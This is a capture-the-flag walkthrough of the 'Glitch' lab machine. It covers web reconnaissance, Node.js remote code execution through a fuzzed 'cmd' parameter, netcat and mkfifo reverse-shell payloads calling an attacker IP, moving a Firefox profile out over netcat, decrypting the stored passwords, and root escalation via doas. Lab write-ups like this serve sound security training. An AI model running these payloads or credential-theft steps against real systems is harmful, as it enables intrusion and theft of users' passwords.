Challenge showcasing a web app and simple privilege escalation. Can you find the glitch?

Scan the target machine with nmap

```
nmap -sC -sV <IP>
```

![nmap](/assets/images/thm/glitch/nmap.png)

There is open port 80 HTTP. We can scan for any hidden directories. I'm going to use gobuster.

```
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x txt,php
```

While we are waiting for the result scan from gobuster, we can visit this web application.

![webpage](/assets/images/thm/glitch/webpage.png)

There is nothing interesting, let's review the source code `Ctrl + U` or you can also add `view-source:` at the beginning of the url

```
view-source:http://<IP>/
```

![source-code](/assets/images/thm/glitch/source-code.png)

There is a java script code with a function `getAccess()` which calls the method `fetch()`. The Fetch API is a modern interface that allows you to make HTTP requests to servers from web browsers(for more additional information you can visit <https://www.javascripttutorial.net/javascript-fetch-api/>). In general fetch method makes a request to `/api/access` endpoint and the result of this request is send to the console log. Meanwhile the gobuster scan has finished.

![gobuster](/assets/images/thm/glitch/gobuster.png)

I have visit `/secret` directory but it looks the same as the root directory.

![secret](/assets/images/thm/glitch/secret.png)

Anyways... let's execute the getAccess function. Open the browser's developer tool by pressing `f12` and navigate to `Console` tab. Now just execute the function.

![console-log](/assets/images/thm/glitch/console-log.png)

It returns a token with base64 encoded value. Use the following command to decode it.

```
echo dGhpc19pc19ub3RfcmVhbA== | base64 -d
```

The result is: `this_is_not_real`. Now in Developer tool navigate to `Storage` and change the token's value with the found one and refresh the page.

![token](/assets/images/thm/glitch/token.png)

Check the source code again.

![spurce-code-token](/assets/images/thm/glitch/spurce-code-token.png)

There is a script.js, let's visit it.

![script](/assets/images/thm/glitch/script.png)

The script in general populate the page with elements from `/api/items` endpoint. You can check them by visiting `view-source:http://<IP>/api/items`

I have been stuck here for a while and wasn't sure what to do. Secret directory didn't show anything even after we had set the token. I have looked at the hint and I realized that we need to play with different requests. For some information about the different HTTP methods visit: <https://assertible.com/blog/7-http-methods-every-web-developer-should-know-and-how-to-test-them>

Now open Burp Suite and catch the request from our target and send it to Repeater.

![burp-catch](/assets/images/thm/glitch/burp-catch.png)

Now from Repeater tab change the GET request to POST

![burp-post](/assets/images/thm/glitch/burp-post.png)

Good, we have received a message. In general POST requests are used to send data and these data take place in the body request. However we can send a POST request without a body and instead use query string parameters. To find this parameter we need to fuzz the request, we can use Intruder mode of the Burp Suite but it is slow, so I'm going to use wfuzz for that purpose.

```
wfuzz -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --hc 400 -X POST http://<IP>/api/items?FUZZ=value
```

where

```
-z : specify the payload
--hc : hide responses with the specified code
```

![wfuzz](/assets/images/thm/glitch/wfuzz.png)

I don't know why it returns some of the results which result is 400 but anyways, we have found the query parameter `cmd`. It looks that we should be able to execute some commands, so I tried to execute `id` command.

![burp-cmd](/assets/images/thm/glitch/burp-cmd.png)

Unfortunately we received an error. I made some research and I found these articles: <https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44> and <https://www.truesec.com/hub/blog/reverse-shell-through-a-node-js-math-parser>

In general it's a vulnerability that allows unauthenticated remote code execution. First thing that I tried, was to check whether I would be able to execute commands, Using `process.cwd()` we can see the current working directory. Let's try it.

![burp-cwd](/assets/images/thm/glitch/burp-cwd.png) 

Here we go... the command was successfully executed. Now, let's try to execute a reverse shell. First start a listener on your attacking machine.

```
nc -lvnp 4444
```

I have first tried with netcat with the following modules:

```
require("child_process").exec('nc <IP> 4444 -e /bin/bash')
```

Note that we need to encode the command, you can use this site for that purpose <https://meyerweb.com/eric/tools/dencoder/>

```
require("child_process").exec('nc%2010.10.41.235%204444%20-e%20%2Fbin%2Fbash')
```

The command was executed successfully but we weren't able to get shell.

![burp-nc](/assets/images/thm/glitch/burp-nc.png) 

So I decided to test with mkfifo.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> 4444 >/tmp/f
```

and again encode the payload

```
require("child_process").exec('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.10.41.235%204444%20%3E%2Ftmp%2Ff')
```

![burp-mkfifo](/assets/images/thm/glitch/burp-mkfifo.png)

We were able to get the reverse shell. Now we need to escalate our privileges but let's first spawn tty.

```
python3 -c "import pty;pty.spawn('/bin/bash')"
ctrl+z
stty raw -echo
fg
```

I checked whether the cuurent user has any rights to execute commands as root with the following command `sudo -l` but we do not have a password. In addition I checked whether there are any scripts run as cron job by reading `/etc/crontab` but unfortunatelly there is nothing there. Finally I searched for files with SUID bit set, which allows us to run a file with the same permissions as the owner of the file.

```
find / -type f -perm -u=s 2>/dev/null
```

![suid](/assets/images/thm/glitch/suid.png)

`/usr/local/bin/doas` this looks interesting. Based on this article <https://book.hacktricks.xyz/linux-hardening/privilege-escalation#doas> `doas` is alternative of `sudo`. I wasn't able to find the configuration here: `/etc/doas.conf`, so I searched for it through the system.

```
find / -type f -name doas.conf 2>/dev/null
```

![doas-config](/assets/images/thm/glitch/doas-config.png)

It looks that the user `v0id` has the permission to execute this command which means we need to escalate our privileges to `v0id` first. In the current user's home directory we can find hidden directory `firefox`.

![user-home](/assets/images/thm/glitch/user-home.png)

Based on the following article <https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data> it's a profile folder where firefox stores user's bookmark's, passwords and other user data. Again using hacktricks as a reference <https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/browser-artifacts#firefox> we can use <https://github.com/unode/firefox_decrypt> to decrypt the master password.

Now, we need to download firefox folder on our attacking machine. I was able to start python server on the target machine using `python -m SimpleHTTPServer 8000` but I was not able to download the folder on my attacking machine. It looks that it is filtered.

![filtered](/assets/images/thm/glitch/filtered.png)

The other method that we can transfer the directory is through netcat, but netcat can transfer files, so we need to convert the folder into an archive.

Start listener on your attacking machine and store the result into a file.
```
nc -lvp 1234 > firefox_archive
```

On the target machine archive the folder and send it through netcat.
```
tar -cf firefox-archive .firefox/
nc -vn <ATTACKING_MACHINE_IP> 1234 < firefox-archive
```

![transfer](/assets/images/thm/glitch/transfer.png)

Now clone firefox decryption tool and get master password.

```
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt
python3.9 firefox_decrypt.py ../.firefox/b5w4643p.default-release/
```

![master-password](/assets/images/thm/glitch/master-password.png)

Well done. Let's try to switch to `v0id` user using the found password.

![switch](/assets/images/thm/glitch/switch.png)

As we already know that this user can execute `doas` command, let's escalate our privileges to root.

```
doas /bin/bash
```

![root](/assets/images/thm/glitch/root.png)
